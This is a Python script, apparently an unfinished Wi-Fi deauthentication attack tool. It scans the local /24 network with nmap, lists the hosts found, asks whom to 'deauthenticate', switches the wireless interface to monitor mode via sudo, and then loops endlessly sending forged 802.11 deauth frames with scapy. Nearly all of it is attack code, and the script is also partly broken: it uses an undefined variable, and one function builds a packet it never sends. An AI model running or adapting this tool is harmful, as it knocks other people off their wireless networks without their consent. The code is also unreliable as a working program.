import nmap
import netifaces
from scapy.all import *
import StringIO
from subprocess import check_output
from deauth_classes_module import EligibleHost

def get_iface():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            iface = split_line[3]
            return iface

def get_bssid(iface):
    pipe = subprocess.Popen(['iwconfig', iface], stdout = subprocess.PIPE)
    for line in pipe.stdout:
        if 'Mode:' in line:
            split_line = line.split()
            bssid = split_line[-1]
    pipe.stdout.close()
    return bssid


def get_network_id():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            ap_ip = split_line[2]
            network_id_raw = ap_ip.split('.')
            network_id = network_id_raw[0] + '.' + network_id_raw[1] + '.' + network_id_raw[2] + '.0/24'
    return network_id

def get_ap_ip():
    routing_table = StringIO.StringIO(conf.route)
    for line in routing_table:
        split_line = line.split()
        if split_line[0] == '0.0.0.0':
            ap_ip = split_line[2]
            return ap_ip


def collect_eligible_hosts(nm_scan, local_ip, default_gateway):
    eligible_hosts = []
    for key, value in nm_scan['scan'].iteritems():
        if 'mac' in value['addresses']:
            mac_address = value['addresses']['mac']
        else:
            mac_address = '--:--:--:--:--:--'
        host_name = value['hostnames'][0]['name']
        ip_address = value['addresses']['ipv4']
        if ip_address != local_ip and ip_address != default_gateway:
            eh = EligibleHost(host_name, ip_address, mac_address)
            eligible_hosts.append(eh)

    return eligible_hosts

def enable_monitor_mode(iface):
    subprocess.call('sudo service network-manager stop', shell = True)
    subprocess.call('sudo ifconfig ' + iface + ' down', shell=True)
    subprocess.call('sudo iwconfig ' + iface + ' mode Monitor', shell=True)
    subprocess.call('sudo ifconfig ' + iface + ' up', shell=True)

def disable_monitor_mode(iface):
    subprocess.call('ifconfig ' + iface + ' down', shell=True)
    subprocess.call('iwconfig ' + iface + ' mode Managed', shell=True)
    subprocess.call('ifconfig ' + iface + ' up', shell=True)

def ask_user():
    user_choice = input('Who would you like to deauthenticate? ')
    return user_choice

def deauthenticate_client(user_choice, eligible_hosts, bssid):

    client_to_deauth = eligible_hosts[user_choice].mac_address

    client_to_deauth = client_to_deauth.encode('ascii', 'ignore')

    packet = RadioTap()/Dot11(type=0,subtype=12,addr1=client_to_deauth,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7)


def display_eligible_hosts(eligible_hosts):
    print('ID'+'\t'+'MAC'+'\t\t\t'+'IPv4'+'\t\t\t'+'HOST')
    for i in range(0, len(eligible_hosts)):
        print(str(i) + '\t' + eligible_hosts[i].mac_address + '\t' + eligible_hosts[i].ip_address + '\t\t' + eligible_hosts[i].host_name)







def main():

    # bssid = get_bssid(iface)



    # needs try / catch
    iface = netifaces.gateways()['default'][netifaces.AF_INET][1]
    conf.iface = iface

    local_mac = netifaces.ifaddresses(iface)[netifaces.AF_LINK][0]['addr']
    local_ip = netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']
    print local_mac
    print local_ip

    bssid = get_bssid(iface)

    nm = nmap.PortScanner()
    nm_scan = nm.scan(hosts = '192.168.0.0/24', arguments='-sP')
    eligible_hosts = collect_eligible_hosts(nm_scan, local_ip, '192.168.0.1')
    display_eligible_hosts(eligible_hosts)
    user_choice = ask_user()
    enable_monitor_mode(iface)

    # client_to_deauth = eligible_hosts[2].mac_address
    while (True):
        for e in eligible_hosts:
            for n in range(20):
                sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=test_client,addr2=bssid,addr3=bssid)/Dot11Deauth(reason=7))
    # WirelessLAN.display_eligible_hosts()
    #
    # user_choice = ask_user()
    #
    #
    # deauthenticate_client(user_choice, WirelessLAN.eligible_hosts, bssid)


if __name__ == "__main__":
    main()
